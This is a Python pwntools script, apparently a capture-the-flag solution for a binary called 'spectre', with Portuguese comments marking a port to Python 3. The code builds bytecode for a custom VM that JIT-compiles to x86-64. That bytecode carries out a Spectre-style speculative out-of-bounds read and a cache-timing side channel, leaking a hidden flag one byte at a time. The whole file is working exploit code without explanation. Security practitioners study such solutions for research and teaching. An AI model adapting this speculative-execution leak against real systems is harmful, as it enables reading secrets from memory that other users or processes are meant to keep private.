from pwn import *
import struct

context.arch = 'amd64'
context.log_level = 'critical'

# --- ALTERAÇÃO AQUI ---
# Inicializa como bytes, não como string
payload = b''
bc = b''

def encode_prologue(bc):
    # --- ALTERAÇÃO AQUI (b'') ---
    bc += b'\x56\x57\x55'
    for i in range(0, 8):
        bc = push_reg(bc, i)
    bc = mov_reg_const64(bc, 0x16, 0x133700000000)
    bc = mov_reg_const64(bc, 0x17, 0x414100000000)
    bc = mov_reg_const64(bc, 0x15, 0x666600000000 + 0x1008)
    return bc

def push_reg(bc, reg):
    if reg > 0xf:
        reg = reg - 0x10
    else:
        # --- ALTERAÇÃO AQUI (bytes) ---
        bc += bytes([0x41])
    # --- ALTERAÇÃO AQUI (bytes) ---
    bc += bytes([reg | 0x50])
    return bc

def mov_reg_const64(bc, reg, val):
    if reg > 0xf:
        # --- ALTERAÇÃO AQUI (bytes) ---
        bc += bytes([0x48])
        # --- ALTERAÇÃO AQUI (bytes) ---
        bc += bytes([(reg - 0x10) | 0xb8])
        bc += struct.pack('<Q', val)
    return bc

def encode_epilogue(bc):
    global payload
    start = len(bc)
    for i in range(7, -1, -1):
        bc = pop_reg(bc, i)
    # --- ALTERAÇÃO AQUI (b'') ---
    bc += b'\x5d\x5f\x5e\xc3'
    # --- ALTERAÇÃO AQUI (b'') ---
    payload += b'\x00'
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def pop_reg(bc, reg):
    if reg > 0xf:
        reg = reg - 0x10
    else:
        # --- ALTERAÇÃO AQUI (bytes) ---
        bc += bytes([0x41])
    # --- ALTERAÇÃO AQUI (bytes) ---
    bc += bytes([reg | 0x58])
    return bc

def cdq(reg, bc):
    global payload
    start = len(bc)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x4d\x63' + bytes([((8 * (reg & 7)) | (reg >> 3) & 7 | 0xC0)])
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x01' + bytes([reg])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def add(reg, bc):
    global payload
    start = len(bc)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x4d\x01' + bytes([reg | 0xC0])
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x02' + bytes([reg])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def sub(reg, bc):
    global payload
    start = len(bc)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x4d\x29' + bytes([reg | 0xC0])
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x03' + bytes([reg])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def my_and(reg, bc):
    global payload
    start = len(bc)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x4d\x21' + bytes([reg | 0xC0])
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x04' + bytes([reg])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def shl(reg, bc):
    global payload
    start = len(bc)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x44\x88' + bytes([reg & 0x38 | 0xC1]) + b'\x49\xd3' + bytes([reg & 7 | 0xE0])
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x05' + bytes([reg])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def shr(reg, bc):
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x44\x88' + bytes([reg & 0x38 | 0xC1]) + b'\x49\xd3' + bytes([reg & 7 | 0xE8])
    return bc

def mov(reg, bc):
    global payload
    start = len(bc)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x4d\x89' + bytes([reg | 0xC0])
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x07' + bytes([reg])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def movc(reg, val, bc):
    global payload
    start = len(bc)
    bc = mov_reg_const(bc, reg & 7, val)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x08' + bytes([reg]) + struct.pack('<I', val)
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def mov_reg_const(bc, reg, val):
    if reg > 0xf:
        # --- ALTERAÇÃO AQUI (b'') ---
        bc += b'\x48\xc7'
        reg -= 0x10
    else:
        # --- ALTERAÇÃO AQUI (b'') ---
        bc += b'\x49\xc7'
    # --- ALTERAÇÃO AQUI (bytes) ---
    bc += bytes([reg | 0xC0])
    bc += struct.pack('<I', val)
    return bc

def load(reg, bc):
    global payload
    start = len(bc)
    bc = mov_reg_reg(bc, 0x10, (reg >> 3) & 7)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x4c\x8b' + bytes([8 * (reg & 7) + 4]) + b'\x07'
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x09' + bytes([reg])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def mov_reg_reg(bc, reg1, reg2):
    if reg1 <= 0xf or reg2 > 8:
        exit(-1)
    # --- ALTERAÇÃO AQUI (b'') ---
    bc += b'\x44\x89'
    # --- ALTERAÇÃO AQUI (bytes) ---
    bc += bytes([(reg1 - 0x10) | (8 * reg2) | 0xC0])
    return bc

def store(reg, bc):
    global payload
    start = len(bc)
    bc = mov_reg_reg(bc, 0x10, reg & 7)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x4c\x89' + bytes([reg & 0x38 | 4]) + b'\x07'
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x0a' + bytes([reg])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def builtin(reg, bc):
    global payload
    start = len(bc)
    if ((reg >> 3) & 7) <= 1:
        # --- ALTERAÇÃO AQUI (b'') ---
        bc += b'\x57\x56'
        for i in range(0, 4):
            bc = push_reg(bc, i)
        # --- ALTERAÇÃO AQUI (b'' e bytes) ---
        bc += b'\x44\x89\xc7\x44\x89\xce\x44\x89\xd2\x44\x89\xd9\xff\x55' + bytes([8 * ((reg >> 3) & 7)])
        for i in range(3, -1, -1):
            bc = pop_reg(bc, i)
        # --- ALTERAÇÃO AQUI (b'' e bytes) ---
        bc += b'\x5e\x5f\x49\x89' + bytes([reg & 7 | 0xC0])
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x0b' + bytes([reg])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

def loop(reg, val, pos, bc):
    global payload
    start = len(bc)
    bc = mov_reg_const(bc, 0x10, val)
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    bc += b'\x49\x39' + bytes([((reg >> 3) & 7) | 0xC0]) + b'\x0f\x8e' + struct.pack('<I', (1<<32) + (pos[1] - 0x10 - start))
    # --- ALTERAÇÃO AQUI (b'' e bytes) ---
    payload += b'\x0c' + bytes([reg]) + struct.pack('<I', val) + struct.pack('<I', pos[0])
    # print "%d: %s" % (start, disasm(bc[start:len(bc)]))
    return bc

if __name__ == '__main__':
    DEBUG = 0
    import sys
    idx = int(sys.argv[1])
    flag_pos = 0x1018+idx
    count = 0
    while True:
        if DEBUG:
            io = process(['./spectre', 'flag'])
            # gdb.attach(io, 'b *0x0000555555554B00\n')

        # --- ALTERAÇÃO AQUI (b'') ---
        payload = b''
        bc = b''
        bc = encode_prologue(bc)
        bc = movc(0, 0, bc)
        bc = movc(1, 0x1000, bc)
        bc = movc(2, 0x1, bc)
        bc = movc(3, 0, bc)
        offset1 = (len(payload), len(bc))
        bc = store(0x93, bc)
        bc = add(0xcb, bc)
        bc = add(0x10, bc)
        bc = loop(0xC3, 0xff, offset1, bc)

        bc = movc(0, 0, bc)
        offset2 = (len(payload), len(bc))
        bc = builtin(7, bc)
        bc = add(0x10, bc)
        bc = loop(0xC3, 65, offset2, bc)

        bc = movc(0, 0x800000, bc)
        offset3 = (len(payload), len(bc))
        bc = store(0xd0, bc)
        bc = add(0x10, bc)
        bc = loop(0xC3, 3*0x800000-1, offset3, bc)

        bc = movc(0, flag_pos, bc)
        bc = movc(4, 12, bc)
        bc = movc(5, 0x6666, bc)
        bc = movc(6, 0x000000ff, bc)
        bc = builtin(7, bc)
        bc = my_and(0xf7, bc)
        bc = shl(0xe7, bc)
        bc = store(0xef, bc)

        bc = movc(0, 0x20, bc)
        offset4 = (len(payload), len(bc))
        bc = mov(0xc3, bc)
        bc = shl(0xe3, bc)
        bc = builtin(0xe, bc)
        bc = load(0x1f, bc)
        bc = builtin(0xf, bc)
        bc = sub(0xf7, bc)
        
        bc = mov(0xc3, bc)
        bc = movc(5, 0x3, bc)
        bc = shl(0xeb, bc)
        bc = store(0xfb, bc)
        bc = add(0x10, bc)
        bc = loop(0xC3, 0x7f, offset4, bc)

        bc = encode_epilogue(bc)

        # print(disasm(bc))

        if DEBUG:
            io.send(p64(len(payload)))
            io.send(payload)
            
            # with open('payload_%d' % idx, 'wb') as f:
            #     f.write(p64(len(payload)) + payload)
            # break
            content = io.recvn(0x1000)
            data = []
            for i in range(0, 0x80-0x20):
                data.append(u64(content[0x100+i*8:0x100+(i+1)*8]))

            ch = 0
            min_time = 0xffffffff
            for i in range(0, 0x80-0x20):
                if min_time > data[i]:
                    min_time = data[i]
                    ch = i
            count += 1
            if min_time < 60:
                # --- ALTERAÇÃO AQUI (print) ---
                # chr() está correto aqui, pois é para imprimir o caractere,
                # não para concatenar com bytes.
                print('idx:', idx, 'Yeah:', chr(ch+0x20))
                # --- ALTERAÇÃO AQUI (print) ---
                print('idx:', idx, 'count:', count)
                break
        
        # Adicionado para fechar o processo em cada loop
        # (se não, dará BrokenPipeError no próximo loop)
        if DEBUG:
            io.close()
